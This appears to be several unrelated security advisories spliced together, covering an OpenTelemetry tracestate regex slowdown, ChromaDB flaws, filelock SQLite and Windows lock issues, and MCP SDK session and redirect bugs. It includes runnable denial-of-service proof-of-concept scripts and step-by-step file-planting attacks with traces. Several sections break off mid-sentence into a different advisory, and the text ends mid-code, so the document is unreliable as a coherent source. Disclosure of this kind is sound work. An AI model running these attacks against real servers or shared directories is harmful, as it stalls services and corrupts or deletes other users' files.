## Summary `TraceState.from_header` splits the inbound W3C `tracestate` header with a regular expression that starts with an unbounded optional-whitespace run, and no length limit is applied first. A run of spaces or tabs that is not followed by a comma costs O(N²) CPU. A single unauthenticated request with a ~100 KB `tracestate` keeps the handling worker busy for ~6 s (spaces) to ~12 s (tabs); under an asyncio server it blocks every other connection for that time.  ## Affected component / version - Package: `opentelemetry-api` (pip) — `opentelemetry/trace/span.py` (`TraceState.from_header`), reached from `opentelemetry/trace/propagation/tracecontext.py` (`TraceContextTextMapPropagator.extract`). - Confirmed in `main` (5e8083e8) and in the v1.44.0 and v1.45.0 tags; the same pattern is present back to v1.0.0 (introduced by #1599, March 2021). Not exhaustively verified against every release in between. - Reachable with the default propagators (`OTEL_PROPAGATORS` defaults to `tracecontext,baggage`) from any server instrumentation that calls `propagate.extract()`, for example `opentelemetry-instrumentation-asgi`.  ## Details  1. The header reaches the parser without any length check:  ```python # opentelemetry-api/src/opentelemetry/trace/propagation/tracecontext.py:57 tracestate_headers = getter.get(carrier, self._TRACESTATE_HEADER_NAME)  # <-- attacker-controlled request header(s), any size if tracestate_headers is None:     tracestate = None else:     tracestate = TraceState.from_header(tracestate_headers)             # <-- no length check before parsing (line 61) ```  2. The split pattern and the parser: ```python # opentelemetry-api/src/opentelemetry/trace/span.py:45 _TRACECONTEXT_MAXIMUM_TRACESTATE_KEYS = 32            # <-- only enforced later, in TraceState.__init__, after the split _delimiter_pattern = re.compile(r"[ 	]*,[ 	]*")      # <-- (line 46) starts with an unbounded [ 	]*  # span.py:382 @classmethod def from_header(cls, header_list: list[str]) -> TraceState:     pairs = {}  # type: dict[str, str]     for header in header_list:         members: list[str] = re.split(_delimiter_pattern, header)   # <-- (line 400) VULNERABLE: O(N^2) on "a=b" + " " * N + "x"         for member in members:             if not member:                 continue             match = _member_pattern.fullmatch(member)             if not match:                 _logger.warning(                                    # <-- also logs the entire malformed member (up to the whole header)                     "Member doesn't match the w3c identifiers format %s",                     member,                 )                 return cls()             ... ```  `re.split` tries the pattern at every offset. At each offset inside a whitespace run, `[ 	]*` consumes the rest of the run, finds no `,`, backtracks and fails, then the engine moves one character forward and repeats. N characters × up to N steps each = O(N²). The 32-member limit never gets a chance to run because `split` has to finish first.  3. The sibling propagator already has the missing guard: ```python # baggage/propagation/__init__.py:68 _MAX_HEADER_LENGTH = 8192 ... if len(header.encode()) > self._MAX_HEADER_LENGTH:   # <-- (line 93) rejected before any regex runs; tracestate has no equivalent     _logger.warning(...)     return context ```  A 16 KiB header costs ≈ 0.25 s and an 8 KiB header ≈ 0.07 s. Measured cost of `extract()` on one core (valid `traceparent`, `tracestate: "a=b" + N spaces + "x"`): the time quadruples each time N doubles (see the proof of concept). Roughly 0.06 s at 10,000 characters, 1 s at 40,000, 4 s at 80,000, 9 s at 100,000 (tabs are about 1.6× slower).   Whether a server lets such a header through (header-size limits, tested): gunicorn rejects ≥ 8190 bytes (response code 431); `uvicorn --http h11` rejects above 16 KiB (400); waitress accepts up to 256 KiB (200 KB accepted, 300 KB rejected); `uvicorn --http httptools` — the default parser with `uvicorn[standard]` — accepted 300 KB, 1 MB, 5 MB and 20 MB `tracestate` headers.  ## Proof of concept  ### A. Show the quadratic cost (no server needed)  1. Install the API: `pip install opentelemetry-api` (any version from 1.0 up to the current main is affected). 2. Save as `poc_tracestate.py`: ```python import logging import time  from opentelemetry.trace.propagation.tracecontext import TraceContextTextMapPropagator  # The library logs the whole malformed member at WARNING; silence it so the timings stay readable. logging.disable(logging.CRITICAL)  TRACEPARENT = "00-0af7651916cd43dd8448eb211c80319c-b7ad6b7169203331-01" propagator = TraceContextTextMapPropagator()  previous = None for n in (10_000, 20_000, 40_000, 80_000):     # N spaces after a valid member, no comma anywhere in the header     carrier = {"traceparent": TRACEPARENT, "tracestate": "a=b" + " " * n + "x"}     start = time.perf_counter()     propagator.extract(carrier)     elapsed = time.perf_counter() - start     growth = f"x{elapsed / previous:.1f}" if previous else "-"     print(f"{n:>7} characters  {elapsed:6.2f} s  growth when size doubles: {growth}")     previous = elapsed ``` 3. Run `python poc_tracestate.py`. 4. **What to observe:** the time grows by about **×4 every time the input size doubles** (a linear parser would show ×2). Absolute numbers depend on the CPU; the growth factor does not. Our run: ```   10000 characters    0.06 s  growth when size doubles: -   20000 characters    0.26 s  growth when size doubles: x4.0   40000 characters    1.04 s  growth when size doubles: x4.0   80000 characters    4.13 s  growth when size doubles: x4.0 ``` Replace `" "` with `"	"` to see ≈1.6× longer.  ### B. Show that one request stalls a real server This uses `OpenTelemetryMiddleware` from `opentelemetry-instrumentation-asgi` around a trivial ASGI app and the default `uvicorn[standard]` parser (httptools).  1. Install: `pip install opentelemetry-api opentelemetry-instrumentation-asgi "uvicorn[standard]"`. 2. Save as `app.py`: ```python from opentelemetry.instrumentation.asgi import OpenTelemetryMiddleware   async def app(scope, receive, send):     await send({"type": "http.response.start", "status": 200, "headers": [(b"content-type", b"text/plain")]})     await send({"type": "http.response.body", "body": b"ok"})   app = OpenTelemetryMiddleware(app) ``` 3. Start the server in one terminal: `uvicorn app:app --host 127.0.0.1 --port 8000 --http httptools` 4. Save as `attack.py`: ```python """Send one oversized tracestate request and, while it is being handled, measure how long an unrelated request to the same server has to wait.""" import socket import sys import threading import time  HOST, PORT = "127.0.0.1", 8000 N = int(sys.argv[1]) if len(sys.argv) > 1 else 100_000 TRACEPARENT = "00-0af7651916cd43dd8448eb211c80319c-b7ad6b7169203331-01"   def get(path, extra=""):     s = socket.create_connection((HOST, PORT), timeout=120)     s.sendall(f"GET {path} HTTP/1.1
Host: x
Connection: close
{extra}
".encode())     start, data = time.perf_counter(), b""     while chunk := s.recv(65536):         data += chunk     return time.perf_counter() - start, data.split(b"
")[0].decode()   result = {} extra = f"traceparent: {TRACEPARENT}
tracestate: a=b{' ' * N}x
" attacker = threading.Thread(target=lambda: result.update(a=get("/attack", extra))) print("idle /ping:               %.3f s  %s" % get("/ping")) attacker.start() time.sleep(0.5)  # let the attack request reach the server first print("/ping during the attack:  %.3f s  %s" % get("/ping")) attacker.join() print("attack request itself:    %.3f s  %s" % result["a"]) ``` 5. In a second terminal run `python attack.py 100000`. 6. **What to observe:** the idle `/ping` answers in milliseconds, but a `/ping` sent half a second *after* the attack request has to wait for the attack request to finish, even though it is a different, innocent request. Our run: ``` idle /ping:               0.000 s  HTTP/1.1 200 OK /ping during the attack:  5.909 s  HTTP/1.1 200 OK     <-- unrelated request delayed ~6 s (event loop blocked) attack request itself:    6.408 s  HTTP/1.1 200 OK ``` 7. Start the server with `--http h11` instead and run the same command: the attack request is rejected immediately (`400 Bad Request`, h11 header cap) and `/ping` is not delayed. Our measurements for `--http httptools`: 30,000 spaces → 0.59 s; 100,000 spaces → 6.57 s with the concurrent `/ping` delayed 6.07 s; 100,000 tabs → 12.39 s with the concurrent `/ping` delayed 11.89 s.  ## Severity **Likelihood: Low.** Any unauthenticated client can trigger it with one request on the default propagators, but only on servers that accept headers larger than roughly 16–30 KB.  **Impact: Medium.** One request of about 100 KB costs 6–12 s of server CPU and, under an asyncio server, stalls every other connection for that time; repeating it keeps the service unavailable.  **Severity: Medium.**  ## Suggested remediation Replace the regex split with a plain `split` and strip; this removes the quadratic behaviour and is equivalent on valid input: ```diff --- a/opentelemetry-api/src/opentelemetry/trace/span.py +++ b/opentelemetry-api/src/opentelemetry/trace/span.py @@ def from_header(cls, header_list: list[str]) -> TraceState:          for header in header_list: -            members: list[str] = re.split(_delimiter_pattern, header) +            members: list[str] = [m.strip(" 	") for m in header.split(",")] ``` `_delimiter_pattern` (line 46) is then unused and can be removed. We also suggest rejecting a header longer than the W3C limit (512 characters for the list) before parsing, the way the baggage propagator does with `_MAX_HEADER_LENGTH`. On valid input the two forms return identical members (empty members preserved); the only behaviour change is that a header with leading whitespace is now accepted instead of producing an empty `TraceState`, which is more spec-compliant. Cost at N = 100,000 drops from ~9 s to ~5e-5 s.  ## Credit  Discovered and reported by SecDim Security Research secdim.com | @secdim | security@secdim.com  ---  **FROM MAINTAINERS**  ## Summary  `TraceState.from_header()` in `opentelemetry-api` used a regular-expression-based operation whose processing time could grow disproportionately when parsing specially crafted inbound `tracestate` headers.  Because W3C Trace Context is enabled by default in OpenTelemetry Python, services accepting untrusted propagation headers could spend excessive CPU time processing a single request.  ## Impact  Services accepting untrusted inbound propagation headers may experience increased per-request CPU usage when processing malformed `tracestate` values. In synchronous servers, this may keep a worker occupied. In asynchronous servers, CPU-intensive parsing may delay other requests handled by the same event loop.  The practical impact depends on the HTTP server, HTTP parser, and any upstream request-header limits. Common servers and proxies may reject oversized headers before they reach the application, while custom carriers or deployments with increased header limits may accept substantially larger values.  Unlike optional propagation formats, W3C Trace Context is part of the default OpenTelemetry Python propagation configuration.  The impact is limited to availability. This issue does not expose or modify telemetry data and does not allow code execution.  ## Patches  Versions of `opentelemetry-api` up to and including `1.45.0` are affected.  Upgrade `opentelemetry-api` to version `1.45.1` or later.  Version `1.45.1` replaces the affected parsing operation with linear-time processing and discards combined `tracestate` headers longer than 8,192 characters.  ## Workarounds  Ensure HTTP header size limits are configured at the server or gateway level. Most Python HTTP servers enforce an 8 KiB header limit by default, which mitigates external attack vectors independently of this fix.

A pre-authentication, code injection vulnerability in version 1.0.0 or later of the ChromaDB Python project allows an unauthenticated attacker to run arbitrary code on the server by sending a malicious model repository and trust_remote_code set to true in the /api/v2/tenants/{tenant}/databases/{db}/collections endpoint.

The SimpleRBACAuthorizationProvider authorization provider in versions 0.5.0 or later of the ChromaDB Python project evaluates whether a user holds a given permission but never checks which tenant, database, or collection that permission applies to allowing users to perform cross tenant actions.

`ReadWriteLock` and `AsyncReadWriteLock` (the SQLite-backed reader/writer lock) hand SQLite a name they do not control. On Linux the lock validates its database through a descriptor (the number the kernel gives a process for an open file). It then connects SQLite to `/proc/self/fd/<n>`, a Linux path that names the process's own open file `n`. SQLite turns that path back into a plain path and reopens it by name, following symlinks (a symlink is a file that points at another path). On every POSIX route SQLite also acts on `-journal`, `-wal` and `-shm` files it finds beside that name. Those are SQLite's side files: the rollback journal (pages saved to undo an interrupted write), the write-ahead log or WAL (changes kept outside the main file), and the shared-memory index for the WAL.  Another local user who can create or rename entries in the directory that holds the lock database can turn this against the user running the lock (below: the lock user). Such a directory is a `0777` or group-writable cache, build or project directory without the sticky bit (a directory flag that lets only a file's owner remove or rename it). That other user can make the lock user's ordinary `read_lock()` or `write_lock()` write bytes of the other user's choosing into the lock user's own files. The same position lets the other user make that call create or unlink files of the lock user, admit a reader beside a writer, or kill the holder. All of this runs with the lock user's privileges. In a sticky directory such as `/tmp` a planted `-wal` file makes every acquire fail. Affected versions are filelock 3.20.4 through 4.2.0 (the `/proc/self/fd` redirect since 4.0.9, the side-file variants since 3.20.4).  Anthropic's OSS Scanner reported this in private as `ANT-2026-KMJ2575J` [high, CWE-363]: ReadWriteLock: SQLite still follows planted symlinks, overwriting files.  ## Severity  **CVSS 3.1 `CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:N/I:H/A:H` scores 7.1 (High).** `AV:L` (local): the other user needs an account on the same host. `PR:L` (low privileges): an ordinary account is enough. `UI:N` (no user interaction). `AC:L` (low attack complexity): the planted-journal variant needs no race, and the redirect won 77 of 77 attempts. `I:H` (high integrity impact): the other user writes bytes of their choosing into files of the lock user and unlinks files of their choosing. `A:H` (high availability impact): the other user makes every acquire fail or kills the lock holder. `C:N` (no confidentiality impact): the other user learns nothing. `S:U` (scope unchanged): the effect stays within the lock user's own privileges.  Classification from the external review: **conditional security**, a cross-user effect that exists only when another user can change names in the lock database's directory. The review notes that the 77/77 inotify result (inotify is a Linux interface that reports file events) is stronger evidence than a theoretical TOCTOU (a time-of-check to time-of-use race). The scanner rated it high. The review accepts the mechanism and narrows it to that precondition.  ## Scope and preconditions  - The other party is a different local account that can create or rename entries in the directory that holds the lock database. That is a `0777` directory or a group-writable one (including a setgid `2775` project directory shared with that account), in each case without the sticky bit. The lock user's lock must be able to open the database read-write, so a database the other user creates is `0666`. filelock itself creates the database `0600`. - Sticky directories (`/tmp`, `/var/tmp`, any `1777` directory) narrow the finding rather than exclude it. The redirect and the journal replay do not reach a database the lock user owns there (tested with `fs.protected_regular=2`). What remains is a planted non-empty `<db>-wal` (any mode; a directory or FIFO works too) that the lock user cannot unlink. It makes every acquire raise `sqlite3.OperationalError: disk I/O error`. A hard link (a second name for the same file) to a file of the lock user at the lock path also remains, if `fs.protected_hardlinks=0`. - Two kernel settings matter. `fs.protected_regular` (1 or 2 is the systemd default on most distributions; the kernel's own default is 0) keeps a user from opening a file another user owns in a sticky world-writable directory. Where it is 0, the other user can own the database in `/tmp`, and SQLite follows a planted symlink itself (not tested). `fs.protected_hardlinks=1` (most distributions; kernel default 0) blocks a hard link of a lock user's file onto the lock path. Neither setting affects a non-sticky shared directory. - Platform and route. The `/proc/self/fd` redirect is Linux with `/proc` mounted, 4.0.9 and later. The side-file variants (`-journal`, `-wal`, `-shm`) exist on every POSIX route. On the hard-link route (macOS since 4.1.1 for every connection, Linux without `/proc`) they need the link-directory swap described under "Mechanism", so a non-sticky parent. Neither the scanner nor the review executed on macOS; the statement rests on the platform branch and the identical code after it. Windows does not take this path. - Ancestor boundary. Protection against another local user is possible only while no other user can replace the lock's directory or any of its ancestors. That holds when each ancestor belongs to the user or root and is either not writable by others or sticky. A user who can rename an entry in a non-sticky directory above the lock controls every name below it. No file-based lock can defend against that.  ## Affected code  At the scanned commit `b831496b0273`: [`_connect_through_descriptor` builds `/proc/self/fd/<n>` and hands it to `sqlite3.connect`](https://github.com/tox-dev/filelock/blob/b831496b0273ecd11bf02b8d080ca8b673a538c1/src/filelock/_read_write.py#L982-L1001). The assumption is the [comment at line 63](https://github.com/tox-dev/filelock/blob/b831496b0273ecd11bf02b8d080ca8b673a538c1/src/filelock/_read_write.py#L63), "Descriptor paths reopen the validated inode" (an inode is the kernel's identity for a file, independent of its name). SQLite first reads the file it opened at [`PRAGMA journal_mode=MEMORY`, line 816](https://github.com/tox-dev/filelock/blob/b831496b0273ecd11bf02b8d080ca8b673a538c1/src/filelock/_read_write.py#L816). The check in [`_raise_if_database_replaced` at line 836](https://github.com/tox-dev/filelock/blob/b831496b0273ecd11bf02b8d080ca8b673a538c1/src/filelock/_read_write.py#L836) runs only after `BEGIN`. Both [`_open_lock_database`](https://github.com/tox-dev/filelock/blob/b831496b0273ecd11bf02b8d080ca8b673a538c1/src/filelock/_read_write.py#L1079-L1091) and [`_raise_if_wal`](https://github.com/tox-dev/filelock/blob/b831496b0273ecd11bf02b8d080ca8b673a538c1/src/filelock/_read_write.py#L1094-L1101) inspect the descriptor, not the file SQLite is on. The one-level hard link of the macOS route is [`_link_beside`](https://github.com/tox-dev/filelock/blob/b831496b0273ecd11bf02b8d080ca8b673a538c1/src/filelock/_read_write.py#L1014-L1029).  ## Introduced  The `/proc/self/fd` redirect came with `4d45e83` ("Merge commit from fork", the fix for GHSA-j8f7-rjxc-mr56), first released in **4.0.9** (verified: `git tag --contains 4d45e83` gives 4.0.9); 4.0.8 does not have it. The side-file variants are older. They reproduce on `cfd4446` ("feat(lock): add SQLite-based ReadWriteLock (#399)"), first released in **3.20.4** (verified), which passed the lock path straight to `sqlite3.connect`.  ## Mechanism  On Linux the lock opens the database with `O_RDWR|O_CREAT|O_NOFOLLOW|O_NONBLOCK`. It checks through the descriptor that the file is a regular file and not a WAL database. It then calls `sqlite3.connect("/proc/self/fd/<n>")` and expects SQLite to reopen the validated inode. SQLite does not open that name. It runs `readlink()` on it, which yields the path string the kernel reports for the descriptor at that moment, and opens that string by path, following every symlink. Without interference the trace shows `readlink("/proc/534/fd/3") = "/tmp/benign/app.lock.db"` and then a second `openat` of that path. The descriptor contributes only a string. Once the directory entry behind the descriptor is gone, the string is `<database> (deleted)`. A symlink with that exact name sends SQLite wherever its creator chose.  The other user prepares the directory before the lock user runs. They create a database `cache.lock.db` (`0666`, so the lock user's lock accepts it) with a second hard link `cache.lock.db.keep`, and the symlink `cache.lock.db (deleted) -> /tmp/victim-notes.txt`. The lock user's `os.open` raises an inotify `IN_OPEN` event. The other user unlinks `cache.lock.db` and links `cache.lock.db.keep` back under the same name. The lock user's descriptor still refers to the unlinked entry, so `/proc/self/fd/3` now reads `/tmp/shared-cache/cache.lock.db (deleted)`. `sqlite3.connect` resolves it, follows the symlink and opens the target `O_RDWR|O_CREAT`. None of filelock's checks look at that file. `_open_lock_database` and `_raise_if_wal` inspect descriptor 3. `_raise_if_database_replaced` compares an `lstat` of the lock path with the descriptor's `(st_dev, st_ino)`, which passes because the other user linked the same inode back, and it runs only after `BEGIN`.  The damage comes from the first statement, `PRAGMA journal_mode=MEMORY`. SQLite finds `<target>-journal`, treats it as the rollback journal of an interrupted transaction, and copies its page records into the target before it checks whether the target is a database at all. The journal header supplies the page size and the page count SQLite resizes the file to. Whoever wrote the journal computed the per-page checksum. The content from offset 0 and the final length are therefore the other user's. Strace of the lock user's process (SQLite 3.40.1):  ``` openat("/tmp/shared-cache/cache.lock.db", O_RDWR|O_CREAT|O_NONBLOCK|O_NOFOLLOW|O_CLOEXEC, 0600) = 3 readlink("/proc/3819/fd/3", "/tmp/shared-cache/cache.lock.db (deleted)", 4096) = 41 readlink("/tmp/shared-cache/cache.lock.db (deleted)", "/tmp/victim-notes.txt", 4096) = 21 openat("/tmp/victim-notes.txt", O_RDWR|O_CREAT|O_NOFOLLOW|O_CLOEXEC, 0644) = 4 openat("/tmp/victim-notes.txt-journal", O_RDWR|O_NOFOLLOW|O_CLOEXEC) = 5 pread64(5, "ATTACKER CONTENT WRITTEN BY THE "..., 4096, 516) = 4096 pwrite64(4, "ATTACKER CONTENT WRITTEN BY THE "..., 4096, 0) = 4096 unlink("/tmp/victim-notes.txt-journal") = -1 EPERM            -> "disk I/O error" ```  The redirect itself needs no journal. The constructor's validation connection already makes SQLite open the target with `O_CREAT`. With the symlink pointing at a missing path in the lock user's home, constructing the lock created that file (empty, `0644`, owned by the lock user) and raised nothing. With the symlink pointing at a `0600` WAL-mode SQLite database of the lock user, `write_lock()` returned without error and the database's header bytes 18 and 19 changed from `2 2` to `1 1`. The pragma converted the lock user's database out of WAL mode, and the redirected acquire held its SQLite lock on that database rather than on the lock database.  **Side-file names beside the database.** Two comments record the belief that SQLite names its side files after the descriptor path ([line 63](https://github.com/tox-dev/filelock/blob/b831496b0273ecd11bf02b8d080ca8b673a538c1/src/filelock/_read_write.py#L63), [line 1095](https://github.com/tox-dev/filelock/blob/b831496b0273ecd11bf02b8d080ca8b673a538c1/src/filelock/_read_write.py#L1095)). The path is not synthetic to SQLite. It derives `<database>-journal`, `<database>-wal` and `<database>-shm` from the resolved real path in the shared directory. `journal_mode=MEMORY` governs only journals SQLite would write, not ones it finds. These variants need no redirect.  *A hot `-journal` makes the lock user unlink a file the journal names; no race.* The other user unlinks the lock user's empty `lock.db`, puts a one-page SQLite database (`0666`) in its place, and writes a 46-byte `lock.db-journal`: a path, its 4-byte length, the 4-byte sum of its bytes and SQLite's journal magic. SQLite treats a journal beside a non-empty database as hot (left by an interrupted transaction). The tail names a "super-journal", and recovery ends by unlinking that file. The lock user's next `read_lock()` or `write_lock()` returns without error and the named file is gone (`unlink("/home/victim/private/notes.txt") = 0`, from a `0700` directory of the lock user). The named file must be a non-empty regular file the lock user can read and unlink. A FIFO planted as `lock.db-journal` instead blocks `read_lock(timeout=2)` in SQLite's `open()` of the journal (still blocked when killed after 10 s).  *A re-planted `-wal` puts the holder in WAL mode past `_raise_if_wal`.* `_raise_if_wal` checks header bytes 18 and 19. Whenever a connection takes its first lock, SQLite stats `<db>-wal`, and if that file and the database are both non-empty it opens the WAL whatever the header says. The pragma at line 816 converts such a database and unlinks `-wal` and `-shm`. The `BEGIN` at line 833 is a separate statement that starts unlocked and stats `<db>-wal` again. Re-creating the 32-byte `-wal` in that gap landed on the first attempt in 20 of 20 runs on a 2-CPU machine.  The lock user's `with lock.write_lock():` then holds the `-shm` byte-120 WAL write lock and only SHARED on the database. Once the other user removes the `-wal`, a second process of the lock user gets `read_lock(timeout=1)` granted while the writer is inside its block, with no exception on either side. SQLite also creates `<db>-shm` with the database's permission bits (`0666`) and keeps it mapped into memory. After the other user truncates it, the writer dies with `SIGBUS` (the signal for touching a mapped file region that no longer exists) in `connection.rollback()` during `release()`.  *A `-wal` in a sticky directory makes every acquire raise; no race, no access to the database.* Beside the lock user's own empty `0600` database, a non-empty `<db>-wal` (one byte, any mode; a directory or FIFO works too) is a leftover SQLite tries to delete. In a `1777` directory the lock user cannot unlink another user's file (`unlink(...) = -1 EPERM`), so the pragma fails with `SQLITE_IOERR_DELETE`. The code in [`_do_acquire_inner`](https://github.com/tox-dev/filelock/blob/b831496b0273ecd11bf02b8d080ca8b673a538c1/src/filelock/_read_write.py#L763) translates only "database is locked" into `Timeout`. `sqlite3.OperationalError: disk I/O error` therefore leaves every `acquire_read()` / `acquire_write()` (and the async variants) within milliseconds, whatever `timeout` or `blocking` says, until the file's owner or root removes it.  *Further effects observed at this commit in a non-sticky directory.* A `0755` script owned by the lock user, renamed to the lock path with a one-record journal beside it, ends up holding the other user's bytes (the acquire raises `file is not a database`). On Windows the soft locks (`SoftFileLock`, `MarkerSoftFileLock`, `SoftFileLease`, their async forms, and a `FileLock` that fell back to a soft lock) read their marker by path. The marker is the lock file whose presence says a process holds the lock. Each `acquire()` attempt that finds a marker opens it with `os.open` to read the holder's process id, and the lock renames and deletes a marker it judges stale, by path. On Windows each of these calls waits for an oplock. An oplock (opportunistic lock) is a request by a process that holds a handle on a file to be told before another process opens, renames or deletes that file; the other process waits until the holder answers the break or closes its handle.  Another local account that can open the marker for reading can take a Level 1 oplock on it while no process holds it open, and leave the break unanswered. Every `acquire()` by the user running the lock (below: the lock user) then waits inside the open, past its `timeout`, `blocking=False` and `cancel_check`, and a stale marker under that oplock is not broken. Mutual exclusion holds and the lock touches no other file. Affected versions are filelock 3.22.0 through 4.2.0 on Windows. On an existing marker that fails with `EEXIST` (or `EACCES` on Windows) at once; the same-account probe shows the failed exclusive create returning at once under an oplock too. `_acquire` then calls `_try_break_stale_lock`, which calls `_read_lock_file`: `os.lstat`, then `os.open(path, O_RDONLY | O_NOFOLLOW | O_NONBLOCK)`. On Windows `O_NOFOLLOW` and `O_NONBLOCK` do not exist (the code reads them with `getattr(os, ..., 0)`), and `os.open` calls `CreateFileW`. When another handle holds a Level 1 or batch oplock on the file, that call sends the holder a break request and returns only when the holder acknowledges it or closes its handle. `_check_give_up` tests the deadline after the attempt returns, so the wait overruns `timeout`, `blocking=False` and `cancel_check` by its length. Once the open returns, the attempt ends and `_check_give_up` raises `Timeout`, because the deadline has passed.  A marker whose holder is gone takes the second path. `break_lock_file` renames it to a break name and unlinks it, by path. On Windows the rename and the delete open the file with delete access, which breaks a Level 1 or batch oplock the same way; the same-account probe shows `os.rename` and `os.unlink` still running after 15 s and returning once the holder closed. The `lifetime` break at L123 runs the same function. A stale marker under such an oplock is therefore not removed, and every attempt by every process waits inside the read. The other account can request the oplock again as soon as the lock user's handle closes, between two attempts or two `acquire()` calls, as in the Linux lease case of GHSA-7hmp-gf99-57hx. `StrictSoftFileLock` and `AsyncStrictSoftFileLock` apply the caller's `mode` to the sentinel (the lock file at `<path>`) and to both claim files (the files whose presence says a process wants or holds the lock). They create the two directories that hold the claims, `<path>.filelock` and `<path>.filelock/claims`, with a bare `mkdir()`. That gives `0o777` filtered through the umask (a per-process mask that removes permission bits from new files and directories) or, under a parent with a default ACL (an access control list on a directory that sets the permissions of entries created inside it), through that ACL.  A hold consists of two claim names in that directory, which has no sticky bit (a directory flag that lets only a file's owner remove it). When the environment leaves another local user (the other user below) a write bit on the directory, that user can unlink the holder's `0600` claims. Three settings do this: umask `000` in a sticky directory such as `/tmp`, umask `002` with the other user in the directory's group, or a default ACL on the lock's parent that grants the group write (the kernel then ignores the umask). After the unlink, the next contender of the holder's account finds the directory empty and enters. The first holder keeps reporting `is_locked == True` and later releases with no error. That is the case when each ancestor belongs to the lock's user or root and is either not writable by others or sticky. A user who can rename entries in a non-sticky directory above the lock controls every name below it. No file-based lock can defend against that.  ## Affected code  At the scanned commit b831496, the bare `mkdir()` sits in [`_ensure_protocol_directory`](https://github.com/tox-dev/filelock/blob/b831496b0273ecd11bf02b8d080ca8b673a538c1/src/filelock/_strict.py#L996-L998). Another local user who cannot read either claim can therefore unlink both. Renaming `claims/` away inside the `0777` `<path>.filelock` has the same effect. For this lock class the directory permissions decide who can end a hold. The sentinel at `<path>` is permanent and says nothing about who holds. A contender starts its doorway by listing the claim directory and proceeds when it is empty. Once the two names are gone, the next contender publishes its own intent and held claims and enters. The original holder does not notice. `is_locked` is its own counter, and `_release` removes its claims by name through `_unlink_owner_path_result`, which takes `FileNotFoundError` as "already removed". The first process therefore releases with exit status 0. No `force_break()`, lifetime or legacy client takes part.  The other user's action is a plain `unlink`. The right to do it comes from filelock's `mkdir`, not from anything the application asked for. In the same setting the other user can neither read nor remove the `0600` sentinel in the sticky parent. With the common umask `022` and no default ACL the directories are `0755`. Other users can then list the claim names, which `mode=0o600` does not suggest either, but cannot remove them, and the second process times out.  ## Reproduction  The scanner's reproducer for finding `ANT-2026-AD6SUOON`, as received, ran against commit b831496b0273ecd11bf02b8d080ca8b673a538c1. ### Summary In affected versions, a Streamable HTTP server in stateful mode (the default) never reclaimed session state:  - sessions did not expire; - a client `DELETE` ended the session but left its entry registered; - a session whose first request was refused stayed registered with a running task.  Each session also kept its parsed `initialize` parameters, and the number of sessions was unlimited. A client that could reach the endpoint could grow server memory without bound using ordinary short requests; only a restart reclaimed it.  ### Am I affected? Yes, if you serve MCP over Streamable HTTP in stateful mode and clients you do not fully trust can reach the endpoint. Stateful mode is the default for:  - `FastMCP` (1.x) - `MCPServer` and `Server.streamable_http_app()` (2.x) - `StreamableHTTPSessionManager`  Affected versions: 1.8.0 through 1.29.1, and 2.0.0 through 2.1.1.  Not affected:  - servers on 1.12.0 or later passing `stateless_http=True` (no sessions are kept) - servers using only the stdio or SSE transports  Authentication limits who can open sessions, not how many a token holder can open.  ### Fix Upgrade to `mcp` 1.30.0 (1.x) or 2.2.0 (2.x) or later. In those versions:  - a session with no request in flight for `session_idle_timeout` seconds (default 1800) is closed and its ID then answers `404`; open streams and in-progress requests keep it alive; - at most `max_sessions` sessions exist at once (default 10000); a request that would open another is answered `503`; - a session is discarded as soon as it ends, whether by `DELETE`, expiry, or a refused opening request.  Both settings are keyword arguments on `FastMCP(...)` (1.x), `MCPServer.run()` / `streamable_http_app()` (2.x) and `StreamableHTTPSessionManager`; `None` disables them.  This bounds retention rather than eliminating it: a live session still holds its `initialize` parameters (up to roughly twice the 4 MiB body limit), and an `initialize` with invalid parameters still opens a session that expires like any other. On a small host, lower `session_idle_timeout`, `max_sessions` and `max_request_body_size` to fit.  If you cannot upgrade yet, pass `stateless_http=True` (1.12.0 or later) where you need no per-session state, or restrict who can reach the endpoint.

### Summary In affected versions, the SDK's Streamable HTTP and SSE client transports followed HTTP redirects to any host. If the configured MCP endpoint answered with a redirect to a different origin:  - custom headers set on the client (for example an `X-API-Key` credential) were sent to that origin, and - on a `307` or `308` redirect the request body was re-sent there too.  The SDK's OAuth client providers followed redirects on their own discovery, registration and token requests in the same way.  A lone `Authorization` bearer header was not exposed; the HTTP library already drops it on cross-origin redirects.  Anyone able to make an endpoint you trust redirect elsewhere (a stale redirect to a lapsed domain, a misrouted proxy rule, redirect logic an attacker can influence) could capture that material. A server that is itself malicious gains nothing this way; it already receives your requests directly.  ### Am I affected? Yes, if your code uses the SDK as an MCP client over HTTP through any of:  - `streamable_http_client` (on 2.x also `Client` given an `http://` or `https://` URL) - `streamablehttp_client` or `sse_client` - `ClientSessionGroup` with HTTP server parameters - the internal `create_mcp_http_client` helper  This includes an HTTP client you passed in yourself with `follow_redirects=True`.  Affected versions: 1.8.0 through 1.29.1, and 2.0.0 through 2.1.1.  Not affected:  - MCP servers - stdio clients - a client you supplied with `follow_redirects` left at its default of `False`  ### Fix Upgrade to `mcp` 1.30.0 (1.x) or 2.2.0 (2.x) or later; no code changes are needed.  The transports, and the OAuth providers' own requests, now follow a redirect only when it stays on the endpoint's origin (same scheme, host and port, or an `http` to `https` upgrade on the same host) and keeps the request method. Any other redirect is not followed and the request fails with an error naming the target (`MCPError` on 2.x, `httpx.HTTPStatusError` on 1.x), whichever HTTP client the transport uses. The internal `create_mcp_http_client` helper no longer turns redirect following on, so code calling it directly now receives the redirect response instead.  If your client currently reaches its server through a redirect to another host, including a server that needs no credentials, it will stop connecting after the upgrade: set the endpoint URL to the redirect's target.  Until you can upgrade, supply your own HTTP client with `follow_redirects` left at `False` (`http_client=` on `streamable_http_client`; `httpx_client_factory=` on `sse_client` and `streamablehttp_client`; `ClientSessionGroup` has no such parameter). If a client may already have followed a redirect to a host you do not control, rotate the credentials it carried.  <details> <summary>If you genuinely need the old behaviour (unsupported)</summary>  This restores what this advisory fixes: redirects to any host are followed again, carrying your custom headers and, on `307`/`308`, the request body, OAuth token requests included. Prefer setting the endpoint URL to the redirect's target. If you cannot, and you accept forwarding credentials to the redirect target, give the transport an HTTP client that follows redirects regardless of what the SDK asks for:  ```python import httpx2  # on 1.x: import httpx and subclass httpx.AsyncClient instead  class FollowRedirectsAnyway(httpx2.AsyncClient):     """Follows redirects to ANY origin. Deliberately gives up the SDK's same-origin protection."""      async def send(self, request, *, follow_redirects=False, **kwargs):         return await super().send(request, follow_redirects=True, **kwargs)  http_client = FollowRedirectsAnyway(timeout=httpx2.Timeout(30, read=300)) # streamable_http_client(url, http_client=http_client)  # sse_client / streamablehttp_client take a factory instead: def client_factory(headers=None, timeout=None, auth=None):     return 